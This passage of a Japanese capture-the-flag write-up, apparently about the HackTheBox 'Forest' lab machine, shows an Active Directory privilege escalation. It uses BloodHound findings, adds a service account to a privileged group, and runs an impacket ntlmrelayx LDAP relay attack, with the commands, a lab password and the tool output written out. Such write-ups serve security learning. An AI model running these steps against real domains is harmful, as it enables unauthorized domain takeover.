![スクリーンショット 2021-12-19 11 53 28](https://user-images.githubusercontent.com/85237728/146662005-5d8cc3e2-c15e-468e-94fd-421ddb4ee40f.png)

-> Blood Houndの`Find Shortest Paths to Domain Admins`を実行すると、**`EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL`グループに所属しているユーザーが`HTB.LOCAL`ドメイン全体の
ACLに対する書き込み権限（Write Dacl）を有していることが確認できる！**

（Write Daclのヘルプ）
> The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL.
> <br>With write access to the target object's DACL, you can grant yourself any privilege you want on the object.

### step.1
まず、`net group`コマンドにて、`svc-alfresco`ユーザを`Exchange Windows Permissions`グループへ追加

```
*Evil-WinRM* PS C:\Users\svc-alfresco> net group "Exchange Windows Permissions" svc-alfresco /add
The command completed successfully.
```
（PowerViewで確認）

```
*Evil-WinRM* PS C:\Users\svc-alfresco> Get-NetUser svc-alfresco
...
memberof  : {CN=Service Accounts,OU=Security Groups,DC=htb,DC=local, CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local}
...
```

### step.2
`impacket`モジュールの`ntlmrelayx.py`にて**NTLM Relay**を狙う（NTLMリレーアタックについては[ここ](https://www.youtube.com/watch?v=915Ugbm39vE)）。

（ntlmrelayxのヘルプ訳）
> 受け付けた全てのコネクションに対して、このモジュールはそのコネクションを指定されたターゲットもしくは元のクライアントへリレーする。

**LDAP client options**：
- `-t TARGET`：クリデンシャルをリレーする相手
- `--escalate-user ESCALATE_USER`：権限昇格させたいユーザをここで指定する（新しいユーザを作る代わりに）

```
┌──(kali㉿kali)-[~]
└─$ sudo ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user svc-alfresco
Impacket v0.9.24.dev1+20211015.125134.c0ec6102 - Copyright 2021 SecureAuth Corporation

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
```
（注）80番ポートを開けておくこと

接続を承認させる

```
┌──(kali㉿kali)-[~]
└─$ curl -u svc-alfresco::s3rvice http://localhost/ 
```

- `-u`：`<user>:<password>`の形で（サーバ認証に必要なとき）指定する

（curl実行後ntlmrelayx.pyの反応）

```
[*] Servers started, waiting for connections
[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
[*] HTTPD: Client requested path: /
```



